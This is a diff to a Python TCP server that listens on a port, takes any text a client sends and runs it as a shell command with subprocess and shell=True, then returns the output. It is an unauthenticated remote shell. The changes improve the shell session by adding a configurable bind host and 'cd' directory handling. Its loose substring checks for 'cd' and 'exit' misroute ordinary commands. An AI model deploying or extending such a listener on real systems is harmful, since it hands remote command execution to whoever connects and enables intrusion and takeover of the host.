@@ -2,6 +2,7 @@
 
 import socket
 import argparse
+import os
 import subprocess
 import logging
 
@@ -20,7 +21,7 @@ def tcp(args):
     """
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(('', args.port))
+        s.bind((args.host, args.port))
         s.listen(5)
         logging.info('Server TCP listening on port {}'.format(args.port))
         print("Listen on port {} ".format(args.port), '\n')
@@ -43,12 +44,26 @@ def tcp(args):
 
         while True:
             response = clientsocket.recv(1024)
+            response = response.decode()
 
-            if 'exit'.encode() in response:
+            if 'exit' in response:
                 print("Close client session")
                 logging.info('Client {} disconnect from the server'.format(address))
                 clientsocket.close()
                 break
+            elif 'cd' in response:
+                try:
+                    if response == "cd":
+                        clientsocket.send(" ".encode())
+                    else:
+                        dir = response.split(" ")
+                        os.chdir(dir[1])
+                        clientsocket.send(" ".encode())
+                except FileNotFoundError as err:
+                    clientsocket.send(str(err).encode())
+                except Exception as err:
+                    print(err)
+                    raise
             else:
                 sh = subprocess.Popen(response, shell=True, executable=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 clientsocket.send(sh.stdout.read())
